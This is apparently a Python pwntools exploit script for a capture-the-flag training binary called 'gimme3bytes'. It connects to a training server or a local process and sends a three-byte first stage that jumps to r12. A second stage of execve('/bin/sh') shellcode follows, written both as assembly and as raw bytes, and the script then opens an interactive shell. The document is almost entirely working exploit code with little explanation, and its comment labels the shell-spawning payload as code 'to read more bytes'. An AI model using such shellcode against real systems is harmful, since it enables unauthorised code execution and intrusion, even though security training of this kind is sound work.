# coding=UTF-8
from pwn import *

'''
SHELLCODE 1 (to read more bytes)

jmp r12
'''

'''
SHELLCODE 2 (to read more bytes)

mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
xor rbx, rbx
push rbx
mov rsi, rsp
mov rdx, rsp
mov rax, 0x3b
syscall
'''

ELF('./gimme3bytes')
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote('bin.training.jinblack.it', 2004)
else:
    r = process('./gimme3bytes')
    gdb.attach(r, '''
        #b *0x4011e3
        #c
    ''')

shellcode_1 =b"\x41\xFF\xE4"
shellcode_2 = b"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"


input('press a key...')
r.sendline(shellcode_1)
r.recvline()
r.sendline(shellcode_2)
r.interactive()

